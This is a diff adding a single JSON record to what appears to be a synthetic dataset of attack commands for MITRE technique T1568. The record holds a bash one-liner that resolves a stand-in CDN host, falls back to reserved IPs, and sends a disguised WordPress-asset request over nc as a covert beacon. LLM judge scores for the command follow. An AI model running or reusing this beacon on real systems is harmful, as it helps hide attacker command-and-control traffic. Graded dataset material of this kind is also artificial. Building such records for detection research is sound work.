@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=cdn-assets.example.com; ip=$(dig +short \\\"$host\\\" | shuf -n1); if [ -z \\\"$ip\\\" ]; then for f in 203.0.113.10 198.51.100.10 192.0.2.10; do ip=\\\"$f\\\"; break; done; fi; ua=\\\"Mozilla/5.0\\\"; chk=$(date -u +%s); printf 'GET /wp-content/themes/twentytwenty/style.css?check=%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAccept: text/css,*/*;q=0.1\\r\\nConnection: close\\r\\n\\r\\n' \\\"$chk\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Resolves a CDN-like host and falls back to reserved IPs if resolution fails; emulates normal WordPress theme asset retrieval to avoid raising suspicion.",
+  "rationale_steps": [
+    "Resolve domain at runtime for dynamic endpoint selection.",
+    "Use fallback IP list when DNS resolution is unavailable.",
+    "Mimic benign HTTP GET to a common WordPress asset path.",
+    "Send via nc over standard TCP/80."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-3ce72b16",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner has balanced quoting, valid command substitutions and control structures, and uses appropriate flags for dig/shuf/nc, so it should parse and execute.",
+        "semantic_score": 4,
+        "semantic_justification": "It performs runtime DNS resolution, randomly selects an endpoint, falls back to alternate IPs, and issues a plausible HTTP GET—demonstrating dynamic endpoint selection consistent with T1568—though it lacks broader rotation/DGA and uses non-routable fallback IPs.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:59:21.829205Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper variable expansions, correct use of command substitution, valid semicolons and logical flow, and appropriate escaping of special characters within the printf format string.",
+        "semantic_score": 4,
+        "semantic_justification": "The command plausibly implements T1568 dynamic resolution by using DNS lookup with random IP selection (shuf -n1) and hardcoded fallback IPs, then crafting a disguised HTTP beacon mimicking a WordPress CSS asset request with a timestamp-based check parameter — however, the fallback IPs are RFC 5737 documentation/reserved ranges (203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24) which would never be reachable in practice, slightly reducing operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T00:16:19.867681Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with correct use of semicolons, pipes, and escaped internal quotes for the bash -c subshell.",
+        "semantic_score": 3,
+        "semantic_justification": "While the logic perfectly mirrors T1568 (runtime resolution and fallback), the use of double quotes for the outer bash -c command causes the parent shell to attempt variable expansion before execution, which would break the logic unless the variables were already defined in the caller's environment.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:16:44.350800Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
